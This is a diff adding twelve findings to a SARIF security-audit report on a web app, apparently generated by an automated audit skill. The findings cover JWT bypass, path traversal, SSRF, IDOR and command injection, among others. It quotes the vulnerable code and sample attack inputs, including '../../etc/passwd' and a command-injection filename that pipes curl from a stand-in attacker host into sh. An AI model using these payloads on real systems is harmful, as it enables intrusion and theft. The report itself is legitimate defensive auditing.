@@ -7,15 +7,546 @@
         "driver": {
           "name": "DevPulse (IBM Bob 2.0 security-audit skill)",
           "informationUri": "https://github.com/ShermaineYap/IBM-BOB2-HACK",
-          "rules": []
+          "rules": [
+            {
+              "id": "prototype-pollution",
+              "name": "PrototypePollution",
+              "shortDescription": {
+                "text": "prototype-pollution (OWASP ASVS V5.1.5)"
+              },
+              "helpUri": "https://owasp.org/www-project-application-security-verification-standard/",
+              "properties": {
+                "tags": [
+                  "security",
+                  "asvs-V5.1.5"
+                ]
+              }
+            },
+            {
+              "id": "weak-random",
+              "name": "WeakRandom",
+              "shortDescription": {
+                "text": "weak-random (OWASP ASVS V6.3.1)"
+              },
+              "helpUri": "https://owasp.org/www-project-application-security-verification-standard/",
+              "properties": {
+                "tags": [
+                  "security",
+                  "asvs-V6.3.1"
+                ]
+              }
+            },
+            {
+              "id": "broken-auth",
+              "name": "BrokenAuth",
+              "shortDescription": {
+                "text": "broken-auth (OWASP ASVS V3.5.3)"
+              },
+              "helpUri": "https://owasp.org/www-project-application-security-verification-standard/",
+              "properties": {
+                "tags": [
+                  "security",
+                  "asvs-V3.5.3"
+                ]
+              }
+            },
+            {
+              "id": "insecure-compare",
+              "name": "InsecureCompare",
+              "shortDescription": {
+                "text": "insecure-compare (OWASP ASVS V2.9.1)"
+              },
+              "helpUri": "https://owasp.org/www-project-application-security-verification-standard/",
+              "properties": {
+                "tags": [
+                  "security",
+                  "asvs-V2.9.1"
+                ]
+              }
+            },
+            {
+              "id": "redos",
+              "name": "Redos",
+              "shortDescription": {
+                "text": "redos (OWASP ASVS V5.1.4)"
+              },
+              "helpUri": "https://owasp.org/www-project-application-security-verification-standard/",
+              "properties": {
+                "tags": [
+                  "security",
+                  "asvs-V5.1.4"
+                ]
+              }
+            },
+            {
+              "id": "mass-assignment",
+              "name": "MassAssignment",
+              "shortDescription": {
+                "text": "mass-assignment (OWASP ASVS V5.1.2)"
+              },
+              "helpUri": "https://owasp.org/www-project-application-security-verification-standard/",
+              "properties": {
+                "tags": [
+                  "security",
+                  "asvs-V5.1.2"
+                ]
+              }
+            },
+            {
+              "id": "open-redirect",
+              "name": "OpenRedirect",
+              "shortDescription": {
+                "text": "open-redirect (OWASP ASVS V5.1.5)"
+              },
+              "helpUri": "https://owasp.org/www-project-application-security-verification-standard/",
+              "properties": {
+                "tags": [
+                  "security",
+                  "asvs-V5.1.5"
+                ]
+              }
+            },
+            {
+              "id": "path-traversal",
+              "name": "PathTraversal",
+              "shortDescription": {
+                "text": "path-traversal (OWASP ASVS V12.3.1)"
+              },
+              "helpUri": "https://owasp.org/www-project-application-security-verification-standard/",
+              "properties": {
+                "tags": [
+                  "security",
+                  "asvs-V12.3.1"
+                ]
+              }
+            },
+            {
+              "id": "ssrf",
+              "name": "Ssrf",
+              "shortDescription": {
+                "text": "ssrf (OWASP ASVS V12.6.1)"
+              },
+              "helpUri": "https://owasp.org/www-project-application-security-verification-standard/",
+              "properties": {
+                "tags": [
+                  "security",
+                  "asvs-V12.6.1"
+                ]
+              }
+            },
+            {
+              "id": "missing-authz",
+              "name": "MissingAuthz",
+              "shortDescription": {
+                "text": "missing-authz (OWASP ASVS V4.2.1)"
+              },
+              "helpUri": "https://owasp.org/www-project-application-security-verification-standard/",
+              "properties": {
+                "tags": [
+                  "security",
+                  "asvs-V4.2.1"
+                ]
+              }
+            },
+            {
+              "id": "info-leak",
+              "name": "InfoLeak",
+              "shortDescription": {
+                "text": "info-leak (OWASP ASVS V7.4.1)"
+              },
+              "helpUri": "https://owasp.org/www-project-application-security-verification-standard/",
+              "properties": {
+                "tags": [
+                  "security",
+                  "asvs-V7.4.1"
+                ]
+              }
+            },
+            {
+              "id": "command-injection",
+              "name": "CommandInjection",
+              "shortDescription": {
+                "text": "command-injection (OWASP ASVS V5.3.8)"
+              },
+              "helpUri": "https://owasp.org/www-project-application-security-verification-standard/",
+              "properties": {
+                "tags": [
+                  "security",
+                  "asvs-V5.3.8"
+                ]
+              }
+            }
+          ]
         }
       },
       "invocations": [
         {
-          "executionSuccessful": true
+          "executionSuccessful": true,
+          "endTimeUtc": "2026-09-26T09:48:34Z"
         }
       ],
-      "results": []
+      "results": [
+        {
+          "ruleId": "prototype-pollution",
+          "level": "error",
+          "message": {
+            "text": "Prototype pollution in deepMerge — no __proto__/constructor guard. deepMerge iterates all keys of the untrusted source object and recursively assigns them to target with no guard for __proto__, constructor, or prototype. An attacker who controls the preferences body can pollute Object.prototype, injecting arbitrary properties onto every object in the process."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "ledger_app/lib/merge.js"
+                },
+                "region": {
+                  "startLine": 3,
+                  "snippet": {
+                    "text": "for (const key of Object.keys(source)) {"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "devpulseId": "audit/hard:F01"
+          },
+          "properties": {
+            "security-severity": "8.0",
+            "asvs": "V5.1.5",
+            "status": "open"
+          }
+        },
+        {
+          "ruleId": "weak-random",
+          "level": "error",
+          "message": {
+            "text": "Password-reset token generated with Math.random(). Math.random() is not cryptographically secure and its output is predictable. An attacker who observes any Math.random output from the same process can predict reset tokens and take over accounts."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "ledger_app/lib/tokens.js"
+                },
+                "region": {
+                  "startLine": 4,
+                  "snippet": {
+                    "text": "  return Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2);"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "devpulseId": "audit/hard:F02"
+          },
+          "properties": {
+            "security-severity": "8.0",
+            "asvs": "V6.3.1",
+            "status": "open"
+          }
+        },
+        {
+          "ruleId": "broken-auth",
+          "level": "error",
+          "message": {
+            "text": "requireAdmin decodes JWT without signature verification. jwt.decode() skips signature verification entirely, so any self-crafted token with role:'admin' grants access to the admin reporting endpoint. An attacker needs only to base64-encode a forged payload."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "ledger_app/middleware/auth.js"
+                },
+                "region": {
+                  "startLine": 19,
+                  "snippet": {
+                    "text": "  const claims = jwt.decode(header.replace('Bearer ', ''));"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "devpulseId": "audit/hard:F03"
+          },
+          "properties": {
+            "security-severity": "8.0",
+            "asvs": "V3.5.3",
+            "status": "open"
+          }
+        },
+        {
+          "ruleId": "insecure-compare",
+          "level": "warning",
+          "message": {
+            "text": "Internal API key compared with === (timing side-channel). String === leaks how many leading bytes match via response-time differences. An attacker making many timed requests can recover the internalApiKey character by character."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "ledger_app/middleware/auth.js"
+                },
+                "region": {
+                  "startLine": 26,
+                  "snippet": {
+                    "text": "  if (req.headers['x-internal-key'] === config.internalApiKey) return next();"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "devpulseId": "audit/hard:F04"
+          },
+          "properties": {
+            "security-severity": "5.0",
+            "asvs": "V2.9.1",
+            "status": "open"
+          }
+        },
+        {
+          "ruleId": "redos",
+          "level": "warning",
+          "message": {
+            "text": "ReDoS via nested quantifiers in EMAIL_RE applied to user input. The pattern ([a-zA-Z0-9._-]+)+ has nested + quantifiers; testing a long non-matching local-part (e.g. 'aaaaaaaaa!') causes catastrophic backtracking. An unauthenticated attacker can hang the event loop with a single POST to /password-reset."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "ledger_app/routes/account.js"
+                },
+                "region": {
+                  "startLine": 12,
+                  "snippet": {
+                    "text": "const EMAIL_RE = /^([a-zA-Z0-9._-]+)+@[a-zA-Z0-9-]+\\.[a-zA-Z]{2,}$/;"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "devpulseId": "audit/hard:F05"
+          },
+          "properties": {
+            "security-severity": "5.0",
+            "asvs": "V5.1.4",
+            "status": "open"
+          }
+        },
+        {
+          "ruleId": "mass-assignment",
+          "level": "error",
+          "message": {
+            "text": "Mass assignment of req.body onto user record allows role escalation. The entire request body is merged onto the user object before it is written back to the database, including the role column. Any authenticated user can escalate to role:'admin' with a single PATCH /me request."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "ledger_app/routes/account.js"
+                },
+                "region": {
+                  "startLine": 32,
+                  "snippet": {
+                    "text": "    Object.assign(user, req.body);"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "devpulseId": "audit/hard:F06"
+          },
+          "properties": {
+            "security-severity": "8.0",
+            "asvs": "V5.1.2",
+            "status": "open"
+          }
+        },
+        {
+          "ruleId": "open-redirect",
+          "level": "warning",
+          "message": {
+            "text": "Unvalidated open redirect in /login/callback via next query param. The /login/callback endpoint redirects to the next query parameter without any origin or path restriction. An attacker can craft a phishing link that sends victims to an arbitrary external site after authentication."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "ledger_app/routes/account.js"
+                },
+                "region": {
+                  "startLine": 57,
+                  "snippet": {
+                    "text": "  const next = String(req.query.next ?? '/');\n  return res.redirect(next);"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "devpulseId": "audit/hard:F07"
+          },
+          "properties": {
+            "security-severity": "5.0",
+            "asvs": "V5.1.5",
+            "status": "open"
+          }
+        },
+        {
+          "ruleId": "path-traversal",
+          "level": "error",
+          "message": {
+            "text": "Path traversal in /files/download/:name — no basename or containment check. req.params.name is joined directly to the upload directory with no basename() stripping or resolved-prefix containment check. An authenticated attacker can request ../../etc/passwd to read arbitrary files on the server."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "ledger_app/routes/files.js"
+                },
+                "region": {
+                  "startLine": 11,
+                  "snippet": {
+                    "text": "  const filePath = path.join(config.uploadDir, req.params.name);"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "devpulseId": "audit/hard:F08"
+          },
+          "properties": {
+            "security-severity": "8.0",
+            "asvs": "V12.3.1",
+            "status": "open"
+          }
+        },
+        {
+          "ruleId": "ssrf",
+          "level": "error",
+          "message": {
+            "text": "SSRF in /webhooks/test — user-supplied URL fetched without allow-list. The URL comes from req.body.url with no allow-list or scheme restriction. An authenticated attacker can make the server probe internal services (e.g. http://169.254.169.254/latest/meta-data/) or arbitrary external endpoints."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "ledger_app/routes/integrations.js"
+                },
+                "region": {
+                  "startLine": 13,
+                  "snippet": {
+                    "text": "    const response = await fetch(target, { method: 'POST', body: JSON.stringify({ ping: true }) });"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "devpulseId": "audit/hard:F09"
+          },
+          "properties": {
+            "security-severity": "8.0",
+            "asvs": "V12.6.1",
+            "status": "open"
+          }
+        },
+        {
+          "ruleId": "missing-authz",
+          "level": "error",
+          "message": {
+            "text": "IDOR in GET /invoices/:id — no owner_id check. The query fetches any invoice by ID without verifying that it belongs to the requesting user. Any authenticated user can enumerate all invoices by iterating IDs, leaking all customer names and amounts."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "ledger_app/routes/invoices.js"
+                },
+                "region": {
+                  "startLine": 24,
+                  "snippet": {
+                    "text": "    const [invoice] = await query('SELECT * FROM invoices WHERE id = $1', [req.params.id]);"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "devpulseId": "audit/hard:F10"
+          },
+          "properties": {
+            "security-severity": "8.0",
+            "asvs": "V4.2.1",
+            "status": "open"
+          }
+        },
+        {
+          "ruleId": "info-leak",
+          "level": "warning",
+          "message": {
+            "text": "Request body (including passwords and tokens) written to server logs. Every request body is logged verbatim, including POST /password-reset (email) and PATCH /me (potentially new password). Anyone with log access can harvest credentials submitted by users."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "ledger_app/server.js"
+                },
+                "region": {
+                  "startLine": 14,
+                  "snippet": {
+                    "text": "  console.log(JSON.stringify({ id: req.id, method: req.method, path: req.path, body: req.body }));"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "devpulseId": "audit/hard:F11"
+          },
+          "properties": {
+            "security-severity": "5.0",
+            "asvs": "V7.4.1",
+            "status": "open"
+          }
+        },
+        {
+          "ruleId": "command-injection",
+          "level": "error",
+          "message": {
+            "text": "Command injection in makeThumbnail via user-controlled fileName. fileName originates from req.params.name and is embedded in a shell command string without sanitization. An attacker can inject shell metacharacters (e.g. a filename containing \"; curl attacker.com | sh;\") to execute arbitrary commands on the server."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "ledger_app/services/thumbnails.js"
+                },
+                "region": {
+                  "startLine": 9,
+                  "snippet": {
+                    "text": "    exec(`convert \"${src}\" -resize 200x200 \"${src}.thumb.png\"`, (err) => (err ? reject(err) : resolve()));"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "devpulseId": "audit/hard:F12"
+          },
+          "properties": {
+            "security-severity": "8.0",
+            "asvs": "V5.3.8",
+            "status": "open"
+          }
+        }
+      ]
     }
   ]
 }
